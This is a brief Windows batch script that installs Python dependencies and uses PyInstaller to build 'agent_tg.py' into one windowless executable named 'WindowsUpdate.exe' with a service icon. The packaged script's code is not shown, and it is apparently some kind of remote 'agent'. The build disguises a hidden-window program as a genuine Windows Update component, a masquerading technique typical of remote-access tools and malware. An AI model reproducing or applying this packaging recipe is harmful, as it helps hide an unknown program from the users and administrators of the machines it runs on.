@echo off
echo Installing dependencies...
pip install -r requirements.txt

echo Building EXE...
pyinstaller --onefile --noconsole --icon=service.ico --name="WindowsUpdate" agent_tg.py

echo.
echo Done! EXE is in dist\WindowsUpdate.exe
pause
